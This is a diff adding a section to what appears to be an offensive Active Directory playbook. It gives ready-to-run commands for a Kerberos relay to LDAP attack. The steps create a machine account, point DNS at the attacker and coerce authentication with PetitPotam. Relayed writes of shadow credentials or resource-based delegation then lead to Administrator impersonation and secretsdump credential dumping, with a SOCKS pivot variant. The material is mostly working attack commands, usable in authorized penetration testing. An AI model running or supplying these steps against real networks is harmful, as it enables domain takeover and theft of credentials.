@@ -577,6 +577,77 @@ export KRB5CCNAME=target.ccache
 secretsdump.py DOMAIN/TARGET$@TARGET.DOMAIN.LOCAL -k -no-pass
 ```
 
+### Kerberos Relay to LDAP (Shadow Credentials / RBCD)
+
+When ADCS HTTP enrollment is disabled, relay Kerberos auth to LDAP instead.
+The relayed machine account has write access to its own object — use it to
+write shadow credentials (`msDS-KeyCredentialLink`) or RBCD
+(`msDS-AllowedToActOnBehalfOfOtherIdentity`).
+
+**Prerequisites:**
+- LDAP signing NOT required on target DC (check via `nxc ldap -M ldap-checker`)
+- Machine account with known credentials (for SPN + AES key — create via
+  `addcomputer.py` if MAQ > 0)
+- DNS record pointing attacker-controlled hostname to attacker IP
+
+**Setup:**
+```bash
+# 1. Create machine account (if not already done)
+addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password1!' \
+  DOMAIN.LOCAL/user:pass -dc-ip DC_IP
+
+# 2. Add SPN to your machine account (required for Kerberos relay)
+#    The victim requests a ticket for this SPN — it must resolve to attacker
+bloodyAD -u YOURPC$ -p 'Password1!' -d DOMAIN.LOCAL --host DC_IP \
+  add dnsRecord YOURPC DC_IP_OF_ATTACKER
+
+# 3. Compute AES key for krbrelayx
+python3 -c "from impacket.krb5.crypto import string_to_key, Enctype; \
+  k = string_to_key(Enctype.AES256, b'Password1!', b'DOMAIN.LOCALYOURPC\$'); \
+  print(k.contents.hex())"
+
+# 4. Start krbrelayx targeting LDAP with shadow credentials
+sudo krbrelayx.py \
+  --target ldap://DC.DOMAIN.LOCAL \
+  -ip ATTACKER_IP \
+  --shadow-credentials --shadow-target TARGET$ \
+  -aesKey AES_KEY_FROM_STEP3 -debug
+
+# 5. Trigger coercion → victim authenticates to YOURPC.DOMAIN.LOCAL
+#    krbrelayx relays to LDAP → writes msDS-KeyCredentialLink on TARGET$
+python3 PetitPotam.py -u user -p 'pass' -d DOMAIN.LOCAL \
+  YOURPC.DOMAIN.LOCAL TARGET_DC
+
+# 6. After shadow creds written — authenticate via PKINIT
+certipy auth -pfx target.pfx -dc-ip DC_IP
+export KRB5CCNAME=target.ccache
+secretsdump.py DOMAIN/TARGET$@TARGET.DOMAIN.LOCAL -k -no-pass
+```
+
+**RBCD variant** (replace step 4):
+```bash
+sudo krbrelayx.py \
+  --target ldap://DC.DOMAIN.LOCAL \
+  -ip ATTACKER_IP \
+  --delegate-access --delegate-from 'YOURPC$' --delegate-to 'TARGET$' \
+  -aesKey AES_KEY -debug
+
+# After RBCD written:
+getST.py -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator \
+  DOMAIN.LOCAL/YOURPC$:'Password1!'
+export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
+secretsdump.py DOMAIN/Administrator@TARGET.DOMAIN.LOCAL -k -no-pass
+```
+
+**Pivoted variant:** If the target DC is behind a SOCKS tunnel, use socat to
+forward LDAP (see Pivoted Relay section above) and point krbrelayx at the
+local forward:
+```bash
+socat TCP-LISTEN:10389,fork,reuseaddr \
+  SOCKS4A:127.0.0.1:DC_IP:389,socksport=SOCKS_PORT &
+sudo krbrelayx.py --target ldap://127.0.0.1:10389 ...
+```
+
 ### Kerberos Reflection (CVE-2025-33073)
 
 Relay a machine's Kerberos auth back to itself via DNS record trick:
